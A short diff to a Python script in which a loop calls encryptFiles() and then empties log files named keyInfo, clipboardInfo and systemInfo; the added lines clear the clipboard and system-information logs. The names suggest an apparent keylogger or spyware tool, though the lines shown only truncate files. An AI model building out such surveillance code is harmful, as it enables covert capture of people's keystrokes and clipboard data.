@@ -204,6 +204,10 @@ while iterations < endIter:
         encryptFiles()
         with open(keyInfo, "w") as f:
             f.write("")
+        with open(clipboardInfo, "w") as f:
+            f.write("")
+        with open(systemInfo, "w") as f:
+            f.write("")
         iterations += 1
         currentTime = time.time()
         stopTime = time.time() + timeIter
